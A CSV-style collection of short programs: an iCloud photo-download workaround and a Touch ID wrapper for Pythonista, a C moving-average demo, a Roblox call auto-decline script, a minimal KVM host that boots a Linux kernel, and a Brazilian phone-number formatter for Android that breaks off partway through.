name,code
DownloadPhotosFromCloud.py
# Quick workaround for photos module (Pythonista) not downloading photos from iCloud


import photos
from objc_util import ObjCClass, ObjCInstance, ObjCBlock


def download_cloud_asset(asset):
 PHImageManager = ObjCClass('PHImageManager')
 PHImageRequestOptions = ObjCClass('PHImageRequestOptions')
 ph_asset = ObjCInstance(asset)
 ph_image_mgr = PHImageManager.defaultManager()
 req_options = PHImageRequestOptions.alloc().init().autorelease()
 req_options.synchronous = True
 req_options.networkAccessAllowed = True
 def handler_f(*args):
 pass
 handler_block = ObjCBlock(handler_f)
 ph_image_mgr.requestImageDataForAsset(ph_asset, options=req_options, resultHandler=handler_block)


def main():
 a = photos.get_assets()[-1]
 print('Downloading data for last asset... (if needed)')
 download_cloud_asset(a)
 print('Done')


if __name__ == '__main__':
 main()
==<SEPERATOR>==
touchid.py
# coding: utf-8
from objc_util import * 
import threading


NSBundle = ObjCClass('NSBundle')
LocalAuthentication = NSBundle.bundleWithPath_('/System/Library/Frameworks/LocalAuthentication.framework')
LocalAuthentication.load()
LAContext = ObjCClass('LAContext')


# authenticate() will raise one of these exceptions when authentication
# fails. They all derive from AuthFailedException, so you can catch that
# if you don't care about the failure reason, but you could also handle
# cancellation differently, for example.
class AuthFailedException (Exception): pass
class AuthCancelledException (AuthFailedException): pass
class AuthTimeoutException (AuthFailedException): pass
class AuthNotAvailableException (AuthFailedException): pass
class AuthFallbackMechanismSelectedException (AuthFailedException): pass


def is_available():
 '''Return True if TouchID authentication is available, False otherwise'''
 context = LAContext.new().autorelease()
 return bool(context.canEvaluatePolicy_error_(1, None))


def authenticate(reason='', allow_passcode=True, timeout=None):
 '''Authenticate the user via TouchID or passcode. Returns True on success, raises AuthFailedException (or a subclass) otherwise.'''
 if not is_available():
 raise AuthNotAvailableException('Touch ID is not available.')
 policy = 2 if allow_passcode else 1
 context = LAContext.new().autorelease()
 event = threading.Event()
 result = {}
 def callback(_cmd, success, _error):
 result['success'] = success
 if _error:
 error = ObjCInstance(_error)
 result['error'] = error
 event.set()
 handler = ObjCBlock(callback, restype=None, argtypes=[c_void_p, c_bool, c_void_p])
 context.evaluatePolicy_localizedReason_reply_(policy, reason, handler)
 if not event.wait(timeout):
 #NOTE: invalidate() is a private method (there's apparently no public API to cancel the TouchID dialog)
 context.invalidate()
 raise AuthTimeoutException('Timeout')
 success = result.get('success', False)
 error = result.get('error')
 if success:
 return True
 elif error:
 error_code = error.code()
 if error_code == -2:
 raise AuthCancelledException('Cancelled by user')
 elif error_code == -3:
 raise AuthFallbackMechanismSelectedException('Fallback authentication mechanism selected')
 else:
 desc = error.localizedDescription() or 'Unknown error'
 raise AuthFailedException(desc)
 else:
 raise AuthFailedException('Unknown error')


# Demo:
def main():
 try:
 reason = 'We need you fingerprint to ste...ehm... to log you in. You have 10 seconds.'
 authenticate(reason, allow_passcode=True, timeout=10)
 print 'Success!'
 except AuthFailedException, e:
 print e


if __name__ == '__main__':
 main()
==<SEPERATOR>==
movingAvg.c
#include <stdio.h>


int movingAvg(int *ptrArrNumbers, long *ptrSum, int pos, int len, int nextNum)
{
 //Subtract the oldest number from the prev sum, add the new number
 *ptrSum = *ptrSum - ptrArrNumbers[pos] + nextNum;
 //Assign the nextNum to the position in the array
 ptrArrNumbers[pos] = nextNum;
 //return the average
 return *ptrSum / len;
}


int main(int argc, char *argv[])
{
 // a sample array of numbers. The represent ""readings"" from a sensor over time
 int sample[] = {50, 10, 20, 18, 20, 100, 18, 10, 13, 500, 50, 40, 10};
 // the size of this array represents how many numbers will be used
 // to calculate the average
 int arrNumbers[5] = {0};


 int pos = 0;
 int newAvg = 0;
 long sum = 0;
 int len = sizeof(arrNumbers) / sizeof(int);
 int count = sizeof(sample) / sizeof(int);


 for(int i = 0; i < count; i++){
 newAvg = movingAvg(arrNumbers, &sum, pos, len, sample[i]);
 printf(""The new average is %d\n"", newAvg);
 pos++;
 if (pos >= len){
 pos = 0;
    }
  }


 return 0;
}
"
"autoDecline.js
","const userIdsThatCanCall = [];


const client = Roblox.RealTime.Factory.GetClient();
client.Subscribe(""CallNotification"", callDetail => {
 if (callDetail.Type === ""NewCall"" && 
 (callDetail.CallerId !== Roblox.CurrentUser.userId && !userIdsThatCanCall.includes(callDetail.CallerId))
 ) {
 CoreUtilities.httpService.post({ 
 url: ""https://apis.roblox.com/call/v1/decline-call"", 
 withCredentials: true 
 }, { callId: callDetail.CallId });
 }
})
"
"kvm-host.c
","#define _GNU_SOURCE
#include <asm/bootparam.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/kvm.h>
#include <linux/kvm_para.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>


struct guest {
 int kvm_fd;
 int vm_fd;
 int vcpu_fd;
 void *mem;
};


static int guest_error(struct guest *g, const char *fmt, ...) {
 va_list args;
 va_start(args, fmt);
 vfprintf(stderr, fmt, args);
 fprintf(stderr, "", errno: %d\n"", errno);
 va_end(args);
 return -1;
}


static int guest_init_regs(struct guest *g) {
 struct kvm_regs regs;
 struct kvm_sregs sregs;
 if (ioctl(g->vcpu_fd, KVM_GET_SREGS, &(sregs)) < 0) {
 return guest_error(g, ""failed to get registers"");
  }


 sregs.cs.base = 0;
 sregs.cs.limit = ~0;
 sregs.cs.g = 1;


 sregs.ds.base = 0;
 sregs.ds.limit = ~0;
 sregs.ds.g = 1;


 sregs.fs.base = 0;
 sregs.fs.limit = ~0;
 sregs.fs.g = 1;


 sregs.gs.base = 0;
 sregs.gs.limit = ~0;
 sregs.gs.g = 1;


 sregs.es.base = 0;
 sregs.es.limit = ~0;
 sregs.es.g = 1;


 sregs.ss.base = 0;
 sregs.ss.limit = ~0;
 sregs.ss.g = 1;


 sregs.cs.db = 1;
 sregs.ss.db = 1;
 sregs.cr0 |= 1; /* enable protected mode */


 if (ioctl(g->vcpu_fd, KVM_SET_SREGS, &sregs) < 0) {
 return guest_error(g, ""failed to set special registers"");
  }


 if (ioctl(g->vcpu_fd, KVM_GET_REGS, &(regs)) < 0) {
 return guest_error(g, ""failed to get registers"");
  }


 regs.rflags = 2;
 regs.rip = 0x100000;
 regs.rsi = 0x10000;


 if (ioctl(g->vcpu_fd, KVM_SET_REGS, &(regs)) < 0) {
 return guest_error(g, ""failed to set registers"");
  }
 return 0;
}


static int guest_init_cpu_id(struct guest *g) {
 struct {
 uint32_t nent;
 uint32_t padding;
 struct kvm_cpuid_entry2 entries[100];
  } kvm_cpuid;
 kvm_cpuid.nent = sizeof(kvm_cpuid.entries) / sizeof(kvm_cpuid.entries[0]);
 ioctl(g->kvm_fd, KVM_GET_SUPPORTED_CPUID, &kvm_cpuid);


 for (unsigned int i = 0; i < kvm_cpuid.nent; i++) {
 struct kvm_cpuid_entry2 *entry = &kvm_cpuid.entries[i];
 if (entry->function == KVM_CPUID_SIGNATURE) {
 entry->eax = KVM_CPUID_FEATURES;
 entry->ebx = 0x4b4d564b; // KVMK
 entry->ecx = 0x564b4d56; // VMKV
 entry->edx = 0x4d;       // M
    }
  }
 ioctl(g->vcpu_fd, KVM_SET_CPUID2, &kvm_cpuid);
 return 0;
}




int guest_init(struct guest *g) {
 if ((g->kvm_fd = open(""/dev/kvm"", O_RDWR)) < 0) {
 return guest_error(g, ""failed to open /dev/kvm"");
  }


 if ((g->vm_fd = ioctl(g->kvm_fd, KVM_CREATE_VM, 0)) < 0) {
 return guest_error(g, ""failed to create vm"");
  }


 if (ioctl(g->vm_fd, KVM_SET_TSS_ADDR, 0xffffd000) < 0) {
 return guest_error(g, ""failed to set tss addr"");
  }


 __u64 map_addr = 0xffffc000;
 if (ioctl(g->vm_fd, KVM_SET_IDENTITY_MAP_ADDR, &map_addr) < 0) {
 return guest_error(g, ""failed to set identity map addr"");
  }


 if (ioctl(g->vm_fd, KVM_CREATE_IRQCHIP, 0) < 0) {
 return guest_error(g, ""failed to create irq chip"");
  }


 struct kvm_pit_config pit = {
      .flags = 0,
  };
 if (ioctl(g->vm_fd, KVM_CREATE_PIT2, &pit) < 0) {
 return guest_error(g, ""failed to create i8254 interval timer"");
  }


 g->mem = mmap(NULL, 1 << 30, PROT_READ | PROT_WRITE,
 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 if (g->mem == NULL) {
 return guest_error(g, ""failed to mmap vm memory"");
  }


 struct kvm_userspace_memory_region region = {
      .slot = 0,
      .flags = 0,
      .guest_phys_addr = 0,
      .memory_size = 1 << 30,
      .userspace_addr = (__u64)g->mem,
  };
 if (ioctl(g->vm_fd, KVM_SET_USER_MEMORY_REGION, &region) < 0) {
 return guest_error(g, ""failed to set user memory region"");
  }


 if ((g->vcpu_fd = ioctl(g->vm_fd, KVM_CREATE_VCPU, 0)) < 0) {
 return guest_error(g, ""failed to create vcpu"");
  }


 guest_init_regs(g);
 guest_init_cpu_id(g);


 return 0;
}


int guest_load(struct guest *g, const char *image_path) {
 size_t datasz;
 void *data;
 int fd = open(image_path, O_RDONLY);
 if (fd < 0) {
 return 1;
  }
 struct stat st;
 fstat(fd, &st);
 data = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
 datasz = st.st_size;
 close(fd);


 struct boot_params *boot =
      (struct boot_params *)(((uint8_t *)g->mem) + 0x10000);
 void *cmdline = (void *)(((uint8_t *)g->mem) + 0x20000);
 void *kernel = (void *)(((uint8_t *)g->mem) + 0x100000);


 memset(boot, 0, sizeof(struct boot_params));
 memmove(boot, data, sizeof(struct boot_params));
 size_t setup_sectors = boot->hdr.setup_sects;
 size_t setupsz = (setup_sectors + 1) * 512;
 boot->hdr.vid_mode = 0xFFFF; // VGA
 boot->hdr.type_of_loader = 0xFF;
 boot->hdr.ramdisk_image = 0x0;
 boot->hdr.ramdisk_size = 0x0;
 boot->hdr.loadflags |= CAN_USE_HEAP | 0x01 | KEEP_SEGMENTS;
 boot->hdr.heap_end_ptr = 0xFE00;
 boot->hdr.ext_loader_ver = 0x0;
 boot->hdr.cmd_line_ptr = 0x20000;
 memset(cmdline, 0, boot->hdr.cmdline_size);
 memcpy(cmdline, ""console=ttyS0"", 14);
 memmove(kernel, (char *)data + setupsz, datasz - setupsz);
 return 0;
}


void guest_exit(struct guest *g) {
 close(g->kvm_fd);
 close(g->vm_fd);
 close(g->vcpu_fd);
 munmap(g->mem, 1 << 30);
}


int guest_run(struct guest *g) {
 int run_size = ioctl(g->kvm_fd, KVM_GET_VCPU_MMAP_SIZE, 0);
 struct kvm_run *run =
 mmap(0, run_size, PROT_READ | PROT_WRITE, MAP_SHARED, g->vcpu_fd, 0);
 for (;;) {
 int ret = ioctl(g->vcpu_fd, KVM_RUN, 0);
 if (ret < 0) {
 return guest_error(g, ""kvm_run failed"");
    }


 switch (run->exit_reason) {
 case KVM_EXIT_IO:
 if (run->io.port == 0x3f8 && run->io.direction == KVM_EXIT_IO_OUT) {
 uint32_t size = run->io.size;
 uint64_t offset = run->io.data_offset;
 printf(""%.*s"", size * run->io.count, (char *)run + offset);
      } else if (run->io.port == 0x3f8 + 5 &&
 run->io.direction == KVM_EXIT_IO_IN) {
 char *value = (char *)run + run->io.data_offset;
 *value = 0x20;
      }
 break;
 case KVM_EXIT_SHUTDOWN:
 printf(""shutdown\n"");
 return 0;
 default:
 printf(""reason: %d\n"", run->exit_reason);
 return -1;
    }
  }
}


int main(int argc, char *argv[]) {
 int r;
 struct guest vm;


 r = guest_init(&vm);
 if (r < 0) {
 fprintf(stderr, ""failed to initialize guest vm: %d, errno=%d\n"", r, errno);
 return 1;
  }


 r = guest_load(&vm, argv[1]);
 if (r < 0) {
 fprintf(stderr, ""failed to load guest image: %d, errno=%d\n"", r, errno);
 return 1;
  }


 guest_run(&vm);
 guest_exit(&vm);
 return 0;
}
==<SEPERATOR>==
BrPhoneNumberFormatter.java
/**
 * Adapted to BR phone format from the class
 * UsPhoneNumberFormatter by Samik Bandyopadhyay:
 * http://stackoverflow.com/a/23659268/332839
 */
public class BrPhoneNumberFormatter implements TextWatcher {


 final int MAX_LENGTH = 11;


 //This TextWatcher sub-class formats entered numbers as (41) 1234(5)?-6789
 private boolean mFormatting; // this is a flag which prevents the stack(onTextChanged)
 private boolean clearFlag;
 private int mLastStartLocation;
 private String mLastBeforeText;
 private WeakReference<EditText> mWeakEditText;


 public BrPhoneNumberFormatter(WeakReference<EditText> weakEditText) {
 this.mWeakEditText = weakEditText;
    }


 @Override
 public void beforeTextChanged(CharSequence s, int start, int count,
 int after) {
 if (after == 0 && s.toString().equals(""("")) {
 clearFlag = true;
        }
 mLastStartLocation = start;
 mLastBeforeText = s.toString();
    }


 @Override
 public void onTextChanged(CharSequence s, int start, int before,
 int count) {
 // TODO: Do nothing
    }


 @Override
 public void afterTextChanged(Editable s) {
 // Make sure to ignore calls to afterTextChanged
 // caused by the work done below
 if (!mFormatting) {
 mFormatting = true;
 int curPos = mLastStartLocation;
 String beforeValue = mLastBeforeText;
 String currentValue = s.toString();
 String formattedValue = formatUsNumber(s);
 if (currentValue.length() > beforeValue.length()) {
 int setCusorPos = formattedValue.length()
                        - (beforeValue.length() - curPos);
 mWeakEditText.get().setSelection(setCusorPos < 0 ? 0 : setCusorPos);
            } else {
 int setCusorPos = formattedValue.length()
                        - (currentValue.length() - curPos);
 if(setCusorPos > 0 && !Character.isDigit(formattedValue.charAt(setCusorPos -1))){
 setCusorPos--;
                }
 mWeakEditText.get().setSelection(setCusorPos < 0 ? 0 : setCusorPos);
            }
 mFormatting = false;
        }
    }


 private String formatUsNumber(Editable text) {
 StringBuilder formattedString = new StringBuilder();


 // Remove everything except digits
 int p = 0;
 while (p < text.length()) {
 char ch = text.charAt(p);
 if (!Character.isDigit(ch)) {
 text.delete(p, p + 1);
            } else {
 p++;
            }
        }


 // Now only digits are remaining
 String allDigitString = text.toString();


 int totalDigitCount = allDigitString.length();


 if(totalDigitCount > MAX_LENGTH) {
 allDigitString = allDigitString.substring(0, MAX_LENGTH);
 totalDigitCount--;
        }


 // Check if we are dealing with the new phone format, with an additional digit
 boolean isLonger = totalDigitCount == MAX_LENGTH;
 int dashAfter = isLonger ? 5 : 4;


 if (totalDigitCount == 0
                || (totalDigitCount > 11 && !allDigitString.startsWith(""(""))
                || totalDigitCount > 12) {
 // May be the total length of input length is greater than the
 // expected value so we'll remove all formatting
